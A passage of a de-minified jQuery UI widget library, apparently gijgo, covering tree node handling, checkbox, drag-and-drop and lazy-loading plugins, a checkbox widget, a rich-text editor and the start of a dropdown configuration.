    if (r && r.length) for (n = 0; n < r.length; n++) {
      if (t == (i = $(r[n])).attr("data-id")) {
        o = i;
        break;
      }
      if (i.has("ul") && (o = gj.tree.methods.getNodeById(i.children("ul"), t))) break;
    }
    return o;
  },
  getNodeByText: function (e, t) {
    var n,
      i,
      o = void 0,
      r = e.children("li");
    if (r && r.length) for (n = 0; n < r.length; n++) {
      if (t === (i = $(r[n])).find('>[data-role="wrapper"]>[data-role="display"]').text()) {
        o = i;
        break;
      }
      if (i.has("ul") && (o = gj.tree.methods.getNodeByText(i.children("ul"), t))) break;
    }
    return o;
  },
  addNode: function (e, t, n, i) {
    var o,
      r,
      a = e.data();
    return n && n.length ? ("li" === n[0].tagName.toLowerCase() && (0 === n.children("ul").length && (n.find('[data-role="expander"]').empty().append(a.icons.collapse), n.append($("<ul />").addClass(a.style.list))), n = n.children("ul")), (r = e.getDataById(n.parent().data("id")))[a.childrenField] || (r[a.childrenField] = []), r[a.childrenField].push(t)) : (n = e.children("ul"), e.data("records").push(t)), o = n.parentsUntil('[data-type="tree"]', "ul").length + 1, a.primaryKey || gj.tree.methods.genAutoId(a, [t]), gj.tree.methods.appendNode(e, n, t, o, i), e;
  },
  remove: function (e, t) {
    return gj.tree.methods.removeDataById(e, t.attr("data-id"), e.data("records")), t.remove(), e;
  },
  removeDataById: function (e, t, n) {
    var i,
      o = e.data();
    for (i = 0; i < n.length; i++) {
      if (o.primaryKey && n[i][o.primaryKey] == t) {
        n.splice(i, 1);
        break;
      }
      if (n[i][o.autoGenFieldName] == t) {
        n.splice(i, 1);
        break;
      }
      n[i][o.childrenField] && n[i][o.childrenField].length && gj.tree.methods.removeDataById(e, t, n[i][o.childrenField]);
    }
  },
  update: function (e, t, n) {
    var i = e.data(),
      o = e.getNodeById(t);
    return e.getDataById(t), o.find('>[data-role="wrapper"]>[data-role="display"]').html(n[i.textField]), gj.tree.events.nodeDataBound(e, o, t, n), e;
  },
  getChildren: function (e, t, n) {
    var i,
      o,
      r = [];
    for (o = (n = void 0 === n || n) ? t.find("ul li") : t.find(">ul>li"), i = 0; i < o.length; i++) r.push($(o[i]).data("id"));
    return r;
  },
  enableAll: function (e) {
    var t,
      n = e.find("ul>li");
    for (t = 0; t < n.length; t++) gj.tree.methods.enableNode(e, $(n[t]), !0);
    return e;
  },
  enableNode: function (e, t, n) {
    var i,
      o,
      r = t.find('>[data-role="wrapper"]>[data-role="expander"]'),
      a = t.find('>[data-role="wrapper"]>[data-role="display"]');
    n = void 0 === n || n;
    if (t.removeClass("disabled"), r.on("click", gj.tree.methods.expanderClickHandler(e)), a.on("click", gj.tree.methods.displayClickHandler(e)), gj.tree.events.enable(e, t), n) for (o = t.find("ul>li"), i = 0; i < o.length; i++) gj.tree.methods.enableNode(e, $(o[i]), n);
  },
  disableAll: function (e) {
    var t,
      n = e.find("ul>li");
    for (t = 0; t < n.length; t++) gj.tree.methods.disableNode(e, $(n[t]), !0);
    return e;
  },
  disableNode: function (e, t, n) {
    var i,
      o,
      r = t.find('>[data-role="wrapper"]>[data-role="expander"]'),
      a = t.find('>[data-role="wrapper"]>[data-role="display"]');
    n = void 0 === n || n;
    if (t.addClass("disabled"), r.off("click"), a.off("click"), gj.tree.events.disable(e, t), n) for (o = t.find("ul>li"), i = 0; i < o.length; i++) gj.tree.methods.disableNode(e, $(o[i]), n);
  },
  destroy: function (e) {
    return e.data() && (gj.tree.events.destroying(e), e.xhr && e.xhr.abort(), e.off(), e.removeData(), e.removeAttr("data-type"), e.removeClass().empty()), e;
  },
  pathFinder: function (e, t, n, i) {
    var o,
      r = !1;
    for (o = 0; o < t.length; o++) {
      if (t[o].id == n) {
        r = !0;
        break;
      }
      if (gj.tree.methods.pathFinder(e, t[o][e.childrenField], n, i)) {
        i.push(t[o].data[e.textField]), r = !0;
        break;
      }
    }
    return r;
  }
}, gj.tree.widget = function (e, t) {
  var n = this,
    i = gj.tree.methods;
  return n.reload = function (e) {
    return gj.widget.prototype.reload.call(this, e);
  }, n.render = function (e) {
    return i.render(this, e);
  }, n.addNode = function (e, t, n) {
    return i.addNode(this, e, t, n);
  }, n.removeNode = function (e) {
    return i.remove(this, e);
  }, n.updateNode = function (e, t) {
    return i.update(this, e, t);
  }, n.destroy = function () {
    return i.destroy(this);
  }, n.expand = function (e, t) {
    return i.expand(this, e, t);
  }, n.collapse = function (e, t) {
    return i.collapse(this, e, t);
  }, n.expandAll = function () {
    return i.expandAll(this);
  }, n.collapseAll = function () {
    return i.collapseAll(this);
  }, n.getDataById = function (e) {
    return i.getDataById(this, e, this.data("records"));
  }, n.getDataByText = function (e) {
    return i.getDataByText(this, e, this.data("records"));
  }, n.getNodeById = function (e) {
    return i.getNodeById(this.children("ul"), e);
  }, n.getNodeByText = function (e) {
    return i.getNodeByText(this.children("ul"), e);
  }, n.getAll = function () {
    return this.data("records");
  }, n.select = function (e) {
    return i.select(this, e);
  }, n.unselect = function (e) {
    return i.unselect(this, e);
  }, n.selectAll = function () {
    return i.selectAll(this);
  }, n.unselectAll = function () {
    return i.unselectAll(this);
  }, n.getSelections = function () {
    return i.getSelections(this.children("ul"));
  }, n.getChildren = function (e, t) {
    return i.getChildren(this, e, t);
  }, n.parents = function (e) {
    var t = [],
      n = this.data();
    return i.pathFinder(n, n.records, e, t), t.reverse();
  }, n.enable = function (e, t) {
    return i.enableNode(this, e, t);
  }, n.enableAll = function () {
    return i.enableAll(this);
  }, n.disable = function (e, t) {
    return i.disableNode(this, e, t);
  }, n.disableAll = function () {
    return i.disableAll(this);
  }, $.extend(e, n), "tree" !== e.attr("data-type") && i.init.call(e, t), e;
}, gj.tree.widget.prototype = new gj.widget(), gj.tree.widget.constructor = gj.tree.widget, jQuery.fn.tree = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.tree.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.tree.widget(this, e);
  }
}, gj.tree.plugins.checkboxes = {
  config: {
    base: {
      checkboxes: void 0,
      checkedField: "checked",
      cascadeCheck: !0
    }
  },
  private: {
    dataBound: function (e) {
      var t;
      e.data("cascadeCheck") && (t = e.find('li[data-role="node"]'), $.each(t, function () {
        var e = $(this),
          t = e.find('[data-role="checkbox"] input[type="checkbox"]').checkbox("state");
        "checked" === t && (gj.tree.plugins.checkboxes.private.updateChildrenState(e, t), gj.tree.plugins.checkboxes.private.updateParentState(e, t));
      }));
    },
    nodeDataBound: function (n, i, e, o) {
      var r, t, a, s, l;
      0 === i.find('> [data-role="wrapper"] > [data-role="checkbox"]').length && (r = n.data(), t = i.find('> [data-role="wrapper"] > [data-role="expander"]'), a = $('<input type="checkbox"/>'), s = $('<span data-role="checkbox"></span>').append(a), l = void 0 !== o[r.disabledField] && "true" === o[r.disabledField].toString().toLowerCase(), a = a.checkbox({
        uiLibrary: r.uiLibrary,
        iconsLibrary: r.iconsLibrary,
        change: function (e, t) {
          gj.tree.plugins.checkboxes.events.checkboxChange(n, i, o, a.state());
        }
      }), l && a.prop("disabled", !0), o[r.checkedField] && a.state("checked"), a.on("click", function (e) {
        var t = a.closest("li"),
          n = a.state();
        r.cascadeCheck && (gj.tree.plugins.checkboxes.private.updateChildrenState(t, n), gj.tree.plugins.checkboxes.private.updateParentState(t, n));
      }), t.after(s));
    },
    updateParentState: function (e, t) {
      var n, i, o, r, a, s;
      1 === (n = e.parent("ul").parent("li")).length && (i = e.parent("ul").parent("li").find('> [data-role="wrapper"] > [data-role="checkbox"] input[type="checkbox"]'), o = e.siblings().find('> [data-role="wrapper"] > span[data-role="checkbox"] input[type="checkbox"]'), r = "checked" === t, a = "unchecked" === t, s = "indeterminate", $.each(o, function () {
        var e = $(this).checkbox("state");
        r && "checked" !== e && (r = !1), a && "unchecked" !== e && (a = !1);
      }), r && !a && (s = "checked"), !r && a && (s = "unchecked"), i.checkbox("state", s), gj.tree.plugins.checkboxes.private.updateParentState(n, i.checkbox("state")));
    },
    updateChildrenState: function (e, t) {
      var n = e.find('ul li [data-role="wrapper"] [data-role="checkbox"] input[type="checkbox"]');
      0 < n.length && $.each(n, function () {
        $(this).checkbox("state", t);
      });
    },
    update: function (e, t, n) {
      var i = t.find('[data-role="checkbox"] input[type="checkbox"]').first();
      $(i).checkbox("state", n), e.data().cascadeCheck && (gj.tree.plugins.checkboxes.private.updateChildrenState(t, n), gj.tree.plugins.checkboxes.private.updateParentState(t, n));
    }
  },
  public: {
    getCheckedNodes: function () {
      var t = [],
        e = this.find('li [data-role="checkbox"] input[type="checkbox"]');
      return $.each(e, function () {
        var e = $(this);
        "checked" === e.checkbox("state") && t.push(e.closest("li").data("id"));
      }), t;
    },
    checkAll: function () {
      var e = this.find('li [data-role="checkbox"] input[type="checkbox"]');
      return $.each(e, function () {
        $(this).checkbox("state", "checked");
      }), this;
    },
    uncheckAll: function () {
      var e = this.find('li [data-role="checkbox"] input[type="checkbox"]');
      return $.each(e, function () {
        $(this).checkbox("state", "unchecked");
      }), this;
    },
    check: function (e) {
      return gj.tree.plugins.checkboxes.private.update(this, e, "checked"), this;
    },
    uncheck: function (e) {
      return gj.tree.plugins.checkboxes.private.update(this, e, "unchecked"), this;
    }
  },
  events: {
    checkboxChange: function (e, t, n, i) {
      return e.triggerHandler("checkboxChange", [t, n, i]);
    }
  },
  configure: function (o) {
    o.data("checkboxes") && gj.checkbox && ($.extend(!0, o, gj.tree.plugins.checkboxes.public), o.on("nodeDataBound", function (e, t, n, i) {
      gj.tree.plugins.checkboxes.private.nodeDataBound(o, t, n, i);
    }), o.on("dataBound", function () {
      gj.tree.plugins.checkboxes.private.dataBound(o);
    }), o.on("enable", function (e, t) {
      t.find('>[data-role="wrapper"]>[data-role="checkbox"] input[type="checkbox"]').prop("disabled", !1);
    }), o.on("disable", function (e, t) {
      t.find('>[data-role="wrapper"]>[data-role="checkbox"] input[type="checkbox"]').prop("disabled", !0);
    }));
  }
}, gj.tree.plugins.dragAndDrop = {
  config: {
    base: {
      dragAndDrop: void 0,
      style: {
        dragEl: "gj-tree-drag-el gj-tree-md-drag-el",
        dropAsChildIcon: "gj-cursor-pointer gj-icon plus",
        dropAbove: "gj-tree-drop-above",
        dropBelow: "gj-tree-drop-below"
      }
    },
    bootstrap: {
      style: {
        dragEl: "gj-tree-drag-el gj-tree-bootstrap-drag-el",
        dropAsChildIcon: "glyphicon glyphicon-plus",
        dropAbove: "drop-above",
        dropBelow: "drop-below"
      }
    },
    bootstrap4: {
      style: {
        dragEl: "gj-tree-drag-el gj-tree-bootstrap-drag-el",
        dropAsChildIcon: "gj-cursor-pointer gj-icon plus",
        dropAbove: "drop-above",
        dropBelow: "drop-below"
      }
    }
  },
  private: {
    nodeDataBound: function (e, t) {
      var n = t.children('[data-role="wrapper"]'),
        i = t.find('>[data-role="wrapper"]>[data-role="display"]');
      n.length && i.length && (i.on("mousedown", gj.tree.plugins.dragAndDrop.private.createNodeMouseDownHandler(e)), i.on("mousemove", gj.tree.plugins.dragAndDrop.private.createNodeMouseMoveHandler(e, t, i)), i.on("mouseup", gj.tree.plugins.dragAndDrop.private.createNodeMouseUpHandler(e)));
    },
    createNodeMouseDownHandler: function (t) {
      return function (e) {
        t.data("dragReady", !0);
      };
    },
    createNodeMouseUpHandler: function (t) {
      return function (e) {
        t.data("dragReady", !1);
      };
    },
    createNodeMouseMoveHandler: function (a, s, l) {
      return function (e) {
        if (a.data("dragReady")) {
          var t,
            n,
            i,
            o,
            r = a.data();
          a.data("dragReady", !1), t = l.clone().wrap('<div data-role="wrapper"/>').closest("div").wrap('<li class="' + r.style.item + '" />').closest("li").wrap('<ul class="' + r.style.list + '" />').closest("ul"), $("body").append(t), t.attr("data-role", "draggable-clone").addClass("gj-unselectable").addClass(r.style.dragEl), t.find('[data-role="wrapper"]').prepend('<span data-role="indicator" />'), t.draggable({
            drag: gj.tree.plugins.dragAndDrop.private.createDragHandler(a, s, l),
            stop: gj.tree.plugins.dragAndDrop.private.createDragStopHandler(a, s, l)
          }), n = l.parent(), i = l.offset().top, i -= parseInt(n.css("border-top-width")) + parseInt(n.css("margin-top")) + parseInt(n.css("padding-top")), o = l.offset().left, o -= parseInt(n.css("border-left-width")) + parseInt(n.css("margin-left")) + parseInt(n.css("padding-left")), o -= t.find('[data-role="indicator"]').outerWidth(!0), t.css({
            position: "absolute",
            top: i,
            left: o,
            width: l.outerWidth(!0)
          }), "true" === l.attr("data-droppable") && l.droppable("destroy"), gj.tree.plugins.dragAndDrop.private.getTargetDisplays(a, s, l).each(function () {
            var e = $(this);
            "true" === e.attr("data-droppable") && e.droppable("destroy"), e.droppable();
          }), gj.tree.plugins.dragAndDrop.private.getTargetDisplays(a, s).each(function () {
            var e = $(this);
            "true" === e.attr("data-droppable") && e.droppable("destroy"), e.droppable();
          }), t.trigger("mousedown");
        }
      };
    },
    getTargetDisplays: function (e, t, n) {
      return e.find('[data-role="display"]').not(n).not(t.find('[data-role="display"]'));
    },
    getTargetWrappers: function (e, t) {
      return e.find('[data-role="wrapper"]').not(t.find('[data-role="wrapper"]'));
    },
    createDragHandler: function (e, t, n) {
      var r = gj.tree.plugins.dragAndDrop.private.getTargetDisplays(e, t, n),
        a = gj.tree.plugins.dragAndDrop.private.getTargetWrappers(e, t),
        s = e.data();
      return function (e, t, n) {
        var i = $(this),
          o = !1;
        r.each(function () {
          var e;
          if ($(this).droppable("isOver", n)) return e = i.find('[data-role="indicator"]'), s.style.dropAsChildIcon ? e.addClass(s.style.dropAsChildIcon) : e.text("+"), !(o = !0);
          i.find('[data-role="indicator"]').removeClass(s.style.dropAsChildIcon).empty();
        }), a.each(function () {
          var e,
            t = $(this);
          !o && t.droppable("isOver", n) ? (e = t.position().top + t.outerHeight() / 2, n.y < e ? t.addClass(s.style.dropAbove).removeClass(s.style.dropBelow) : t.addClass(s.style.dropBelow).removeClass(s.style.dropAbove)) : t.removeClass(s.style.dropAbove).removeClass(s.style.dropBelow);
        });
      };
    },
    createDragStopHandler: function (l, d, e) {
      var t = gj.tree.plugins.dragAndDrop.private.getTargetDisplays(l, d, e),
        c = gj.tree.plugins.dragAndDrop.private.getTargetWrappers(l, d),
        u = l.data();
      return function (e, o) {
        var r,
          a,
          s,
          n,
          i = !1;
        $(this).draggable("destroy").remove(), t.each(function () {
          var e,
            t = $(this);
          if (t.droppable("isOver", o)) return a = t.closest("li"), s = d.parent("ul").parent("li"), 0 === (e = a.children("ul")).length && (e = $("<ul />").addClass(u.style.list), a.append(e)), !1 !== gj.tree.plugins.dragAndDrop.events.nodeDrop(l, d.data("id"), a.data("id"), e.children("li").length + 1) && (e.append(d), r = l.getDataById(d.data("id")), gj.tree.methods.removeDataById(l, d.data("id"), u.records), void 0 === (n = l.getDataById(e.parent().data("id")))[u.childrenField] && (n[u.childrenField] = []), n[u.childrenField].push(r), gj.tree.plugins.dragAndDrop.private.refresh(l, d, a, s)), !(i = !0);
          t.droppable("destroy");
        }), i || c.each(function () {
          var e,
            t,
            n,
            i = $(this);
          if (i.droppable("isOver", o)) return a = i.closest("li"), s = d.parent("ul").parent("li"), e = o.y < i.position().top + i.outerHeight() / 2, n = d.data("id"), t = a.prevAll('li:not([data-id="' + n + '"])').length + (e ? 1 : 2), !1 !== gj.tree.plugins.dragAndDrop.events.nodeDrop(l, n, a.parent("ul").parent("li").data("id"), t) && (r = l.getDataById(d.data("id")), gj.tree.methods.removeDataById(l, d.data("id"), u.records), l.getDataById(a.parent().data("id"))[u.childrenField].splice(a.index() + (e ? 0 : 1), 0, r), e ? d.insertBefore(a) : d.insertAfter(a), gj.tree.plugins.dragAndDrop.private.refresh(l, d, a, s)), !1;
          i.droppable("destroy");
        });
      };
    },
    refresh: function (e, t, n, i) {
      var o = e.data();
      gj.tree.plugins.dragAndDrop.private.refreshNode(e, n), gj.tree.plugins.dragAndDrop.private.refreshNode(e, i), gj.tree.plugins.dragAndDrop.private.refreshNode(e, t), t.find('li[data-role="node"]').each(function () {
        gj.tree.plugins.dragAndDrop.private.refreshNode(e, $(this));
      }), n.children('[data-role="wrapper"]').removeClass(o.style.dropAbove).removeClass(o.style.dropBelow);
    },
    refreshNode: function (e, t) {
      var n = t.children('[data-role="wrapper"]'),
        i = n.children('[data-role="expander"]'),
        o = n.children('[data-role="spacer"]'),
        r = t.children("ul"),
        a = e.data(),
        s = t.parentsUntil('[data-type="tree"]', "ul").length;
      r.length && r.children().length ? r.is(":visible") ? i.empty().append(a.icons.collapse) : i.empty().append(a.icons.expand) : i.empty(), n.removeClass(a.style.dropAbove).removeClass(a.style.dropBelow), o.css("width", a.indentation * (s - 1));
    }
  },
  public: {},
  events: {
    nodeDrop: function (e, t, n, i) {
      return e.triggerHandler("nodeDrop", [t, n, i]);
    }
  },
  configure: function (n) {
    $.extend(!0, n, gj.tree.plugins.dragAndDrop.public), n.data("dragAndDrop") && gj.draggable && gj.droppable && n.on("nodeDataBound", function (e, t) {
      gj.tree.plugins.dragAndDrop.private.nodeDataBound(n, t);
    });
  }
}, gj.tree.plugins.lazyLoading = {
  config: {
    base: {
      paramNames: {
        parentId: "parentId"
      },
      lazyLoading: !1
    }
  },
  private: {
    nodeDataBound: function (e, t, n, i) {
      var o = e.data(),
        r = t.find('> [data-role="wrapper"] > [data-role="expander"]');
      i.hasChildren && r.empty().append(o.icons.expand);
    },
    createDoneHandler: function (r, a) {
      return function (e) {
        var t,
          n,
          i,
          o = r.data();
        if ("string" == typeof e && JSON && (e = JSON.parse(e)), e && e.length) {
          for (0 === (i = a.children("ul")).length && (i = $("<ul />").addClass(o.style.list), a.append(i)), t = 0; t < e.length; t++) r.addNode(e[t], i);
          (n = a.find('>[data-role="wrapper"]>[data-role="expander"]')).attr("data-mode", "open"), n.empty().append(o.icons.collapse), gj.tree.events.dataBound(r);
        }
      };
    },
    expand: function (e, t, n) {
      var i,
        o = e.data(),
        r = {},
        a = t.find(">ul>li");
      a && a.length || "string" == typeof o.dataSource && (r[o.paramNames.parentId] = n, i = {
        url: o.dataSource,
        data: r
      }, e.xhr && e.xhr.abort(), e.xhr = $.ajax(i).done(gj.tree.plugins.lazyLoading.private.createDoneHandler(e, t)).fail(e.createErrorHandler()));
    }
  },
  public: {},
  events: {},
  configure: function (o, e, t) {
    t.lazyLoading && (o.on("nodeDataBound", function (e, t, n, i) {
      gj.tree.plugins.lazyLoading.private.nodeDataBound(o, t, n, i);
    }), o.on("expand", function (e, t, n) {
      gj.tree.plugins.lazyLoading.private.expand(o, t, n);
    }));
  }
}, gj.checkbox = {
  plugins: {}
}, gj.checkbox.config = {
  base: {
    uiLibrary: "materialdesign",
    iconsLibrary: "materialicons",
    style: {
      wrapperCssClass: "gj-checkbox-md",
      spanCssClass: void 0
    }
  },
  bootstrap: {
    style: {
      wrapperCssClass: "gj-checkbox-bootstrap"
    },
    iconsLibrary: "glyphicons"
  },
  bootstrap4: {
    style: {
      wrapperCssClass: "gj-checkbox-bootstrap gj-checkbox-bootstrap-4"
    },
    iconsLibrary: "materialicons"
  },
  materialicons: {
    style: {
      iconsCssClass: "gj-checkbox-material-icons",
      spanCssClass: "gj-icon"
    }
  },
  glyphicons: {
    style: {
      iconsCssClass: "gj-checkbox-glyphicons",
      spanCssClass: ""
    }
  },
  fontawesome: {
    style: {
      iconsCssClass: "gj-checkbox-fontawesome",
      spanCssClass: "fa"
    }
  }
}, gj.checkbox.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "checkbox"), this.attr("data-checkbox", "true"), gj.checkbox.methods.initialize(this), this;
  },
  initialize: function (e) {
    var t,
      n,
      i = e.data();
    i.style.wrapperCssClass && (t = $('<label class="' + i.style.wrapperCssClass + " " + i.style.iconsCssClass + '"></label>'), e.attr("id") && t.attr("for", e.attr("id")), e.wrap(t), n = $("<span />"), i.style.spanCssClass && n.addClass(i.style.spanCssClass), e.parent().append(n));
  },
  state: function (e, t) {
    return t ? ("checked" === t ? (e.prop("indeterminate", !1), e.prop("checked", !0)) : "unchecked" === t ? (e.prop("indeterminate", !1), e.prop("checked", !1)) : "indeterminate" === t && (e.prop("checked", !0), e.prop("indeterminate", !0)), gj.checkbox.events.change(e, t), e) : t = e.prop("indeterminate") ? "indeterminate" : e.prop("checked") ? "checked" : "unchecked";
  },
  toggle: function (e) {
    return "checked" == e.state() ? e.state("unchecked") : e.state("checked"), e;
  },
  destroy: function (e) {
    return "true" === e.attr("data-checkbox") && (e.removeData(), e.removeAttr("data-guid"), e.removeAttr("data-checkbox"), e.off(), e.next("span").remove(), e.unwrap()), e;
  }
}, gj.checkbox.events = {
  change: function (e, t) {
    return e.triggerHandler("change", [t]);
  }
}, gj.checkbox.widget = function (e, t) {
  var n = gj.checkbox.methods;
  return this.toggle = function () {
    return n.toggle(this);
  }, this.state = function (e) {
    return n.state(this, e);
  }, this.destroy = function () {
    return n.destroy(this);
  }, $.extend(e, this), "true" !== e.attr("data-checkbox") && n.init.call(e, t), e;
}, gj.checkbox.widget.prototype = new gj.widget(), gj.checkbox.widget.constructor = gj.checkbox.widget, jQuery.fn.checkbox = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.checkbox.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.checkbox.widget(this, e);
  }
}, gj.editor = {
  plugins: {},
  messages: {}
}, gj.editor.config = {
  base: {
    height: 300,
    width: void 0,
    uiLibrary: "materialdesign",
    iconsLibrary: "materialicons",
    locale: "en-us",
    buttons: void 0,
    style: {
      wrapper: "gj-editor gj-editor-md",
      buttonsGroup: "gj-button-md-group",
      button: "gj-button-md",
      buttonActive: "active"
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-editor gj-editor-bootstrap",
      buttonsGroup: "btn-group",
      button: "btn btn-default gj-cursor-pointer",
      buttonActive: "active"
    }
  },
  bootstrap4: {
    style: {
      wrapper: "gj-editor gj-editor-bootstrap",
      buttonsGroup: "btn-group",
      button: "btn btn-outline-secondary gj-cursor-pointer",
      buttonActive: "active"
    }
  },
  materialicons: {
    icons: {
      bold: '<i class="gj-icon bold" />',
      italic: '<i class="gj-icon italic" />',
      strikethrough: '<i class="gj-icon strikethrough" />',
      underline: '<i class="gj-icon underlined" />',
      listBulleted: '<i class="gj-icon list-bulleted" />',
      listNumbered: '<i class="gj-icon list-numbered" />',
      indentDecrease: '<i class="gj-icon indent-decrease" />',
      indentIncrease: '<i class="gj-icon indent-increase" />',
      alignLeft: '<i class="gj-icon align-left" />',
      alignCenter: '<i class="gj-icon align-center" />',
      alignRight: '<i class="gj-icon align-right" />',
      alignJustify: '<i class="gj-icon align-justify" />',
      undo: '<i class="gj-icon undo" />',
      redo: '<i class="gj-icon redo" />'
    }
  },
  fontawesome: {
    icons: {
      bold: '<i class="fa fa-bold" aria-hidden="true"></i>',
      italic: '<i class="fa fa-italic" aria-hidden="true"></i>',
      strikethrough: '<i class="fa fa-strikethrough" aria-hidden="true"></i>',
      underline: '<i class="fa fa-underline" aria-hidden="true"></i>',
      listBulleted: '<i class="fa fa-list-ul" aria-hidden="true"></i>',
      listNumbered: '<i class="fa fa-list-ol" aria-hidden="true"></i>',
      indentDecrease: '<i class="fa fa-indent" aria-hidden="true"></i>',
      indentIncrease: '<i class="fa fa-outdent" aria-hidden="true"></i>',
      alignLeft: '<i class="fa fa-align-left" aria-hidden="true"></i>',
      alignCenter: '<i class="fa fa-align-center" aria-hidden="true"></i>',
      alignRight: '<i class="fa fa-align-right" aria-hidden="true"></i>',
      alignJustify: '<i class="fa fa-align-justify" aria-hidden="true"></i>',
      undo: '<i class="fa fa-undo" aria-hidden="true"></i>',
      redo: '<i class="fa fa-repeat" aria-hidden="true"></i>'
    }
  }
}, gj.editor.methods = {
  init: function (e) {
    return gj.widget.prototype.init.call(this, e, "editor"), this.attr("data-editor", "true"), gj.editor.methods.initialize(this), this;
  },
  initialize: function (n) {
    var e,
      t,
      i,
      o,
      r,
      a = this,
      s = n.data();
    if (n.hide(), "wrapper" !== n[0].parentElement.attributes.role && ((i = document.createElement("div")).setAttribute("role", "wrapper"), n[0].parentNode.insertBefore(i, n[0]), i.appendChild(n[0])), gj.editor.methods.localization(s), $(i).addClass(s.style.wrapper), s.width && $(i).width(s.width), 0 === (o = $(i).children('div[role="body"]')).length && (o = $('<div role="body"></div>'), $(i).append(o), n[0].innerText && (o[0].innerHTML = n[0].innerText)), o.attr("contenteditable", !0), o.on("keydown", function (e) {
      var t = event.keyCode || event.charCode;
      !1 === gj.editor.events.changing(n) && 8 !== t && 46 !== t && e.preventDefault();
    }), o.on("mouseup keyup mouseout cut paste", function (e) {
      a.updateToolbar(n, r), gj.editor.events.changed(n), n.html(o.html());
    }), 0 === (r = $(i).children('div[role="toolbar"]')).length) for (var l in r = $('<div role="toolbar"></div>'), o.before(r), s.buttons) {
      for (var d in e = $("<div />").addClass(s.style.buttonsGroup), s.buttons[l]) (t = $(s.buttons[l][d])).on("click", function () {
        gj.editor.methods.executeCmd(n, o, r, $(this));
      }), e.append(t);
      r.append(e);
    }
    o.height(s.height - gj.core.height(r[0], !0));
  },
  localization: function (e) {
    var t = gj.editor.messages[e.locale];
    void 0 === e.buttons && (e.buttons = [['<button type="button" class="' + e.style.button + '" title="' + t.bold + '" role="bold">' + e.icons.bold + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.italic + '" role="italic">' + e.icons.italic + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.strikethrough + '" role="strikethrough">' + e.icons.strikethrough + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.underline + '" role="underline">' + e.icons.underline + "</button>"], ['<button type="button" class="' + e.style.button + '" title="' + t.listBulleted + '" role="insertunorderedlist">' + e.icons.listBulleted + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.listNumbered + '" role="insertorderedlist">' + e.icons.listNumbered + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.indentDecrease + '" role="outdent">' + e.icons.indentDecrease + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.indentIncrease + '" role="indent">' + e.icons.indentIncrease + "</button>"], ['<button type="button" class="' + e.style.button + '" title="' + t.alignLeft + '" role="justifyleft">' + e.icons.alignLeft + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.alignCenter + '" role="justifycenter">' + e.icons.alignCenter + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.alignRight + '" role="justifyright">' + e.icons.alignRight + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.alignJustify + '" role="justifyfull">' + e.icons.alignJustify + "</button>"], ['<button type="button" class="' + e.style.button + '" title="' + t.undo + '" role="undo">' + e.icons.undo + "</button>", '<button type="button" class="' + e.style.button + '" title="' + t.redo + '" role="redo">' + e.icons.redo + "</button>"]]);
  },
  updateToolbar: function (e, t) {
    var n = e.data();
    $buttons = t.find("[role]").each(function () {
      var e = $(this),
        t = e.attr("role");
      t && document.queryCommandEnabled(t) && "true" === document.queryCommandValue(t) ? e.addClass(n.style.buttonActive) : e.removeClass(n.style.buttonActive);
    });
  },
  executeCmd: function (e, t, n, i) {
    t.focus(), document.execCommand(i.attr("role"), !1), gj.editor.methods.updateToolbar(e, n);
  },
  content: function (e, t) {
    var n = e.parent().children('div[role="body"]');
    return void 0 === t ? n.html() : n.html(t);
  },
  destroy: function (e) {
    var t;
    return "true" === e.attr("data-editor") && ((t = e.parent()).children('div[role="body"]').remove(), t.children('div[role="toolbar"]').remove(), e.unwrap(), e.removeData(), e.removeAttr("data-guid"), e.removeAttr("data-editor"), e.off(), e.show()), e;
  }
}, gj.editor.events = {
  changing: function (e) {
    return e.triggerHandler("changing");
  },
  changed: function (e) {
    return e.triggerHandler("changed");
  }
}, gj.editor.widget = function (e, t) {
  var n = gj.editor.methods;
  return this.content = function (e) {
    return n.content(this, e);
  }, this.destroy = function () {
    return n.destroy(this);
  }, $.extend(e, this), "true" !== e.attr("data-editor") && n.init.call(e, t), e;
}, gj.editor.widget.prototype = new gj.widget(), gj.editor.widget.constructor = gj.editor.widget, jQuery.fn.editor = function (e) {
  var t;
  if (this && this.length) {
    if ("object" != typeof e && e) {
      if ((t = new gj.editor.widget(this, null))[e]) return t[e].apply(this, Array.prototype.slice.call(arguments, 1));
      throw "Method " + e + " does not exist.";
    }
    return new gj.editor.widget(this, e);
  }
}, gj.editor.messages["en-us"] = {
  bold: "Bold",
  italic: "Italic",
  strikethrough: "Strikethrough",
  underline: "Underline",
  listBulleted: "List Bulleted",
  listNumbered: "List Numbered",
  indentDecrease: "Indent Decrease",
  indentIncrease: "Indent Increase",
  alignLeft: "Align Left",
  alignCenter: "Align Center",
  alignRight: "Align Right",
  alignJustify: "Align Justify",
  undo: "Undo",
  redo: "Redo"
}, gj.dropdown = {
  plugins: {}
}, gj.dropdown.config = {
  base: {
    dataSource: void 0,
    textField: "text",
    valueField: "value",
    selectedField: "selected",
    width: void 0,
    maxHeight: "auto",
    placeholder: void 0,
    fontSize: void 0,
    uiLibrary: "materialdesign",
    iconsLibrary: "materialicons",
    icons: {
      dropdown: '<i class="gj-icon arrow-dropdown" />',
      dropup: '<i class="gj-icon arrow-dropup" />'
    },
    style: {
      wrapper: "gj-dropdown gj-dropdown-md gj-unselectable",
      list: "gj-list gj-list-md gj-dropdown-list-md",
      active: "gj-list-md-active"
    }
  },
  bootstrap: {
    style: {
      wrapper: "gj-dropdown gj-dropdown-bootstrap gj-dropdown-bootstrap-3 gj-unselectable",
      presenter: "btn btn-default",
      list: "gj-list gj-list-bootstrap gj-dropdown-list-bootstrap list-group",
      item: "list-group-item",
      active: "active"
    },
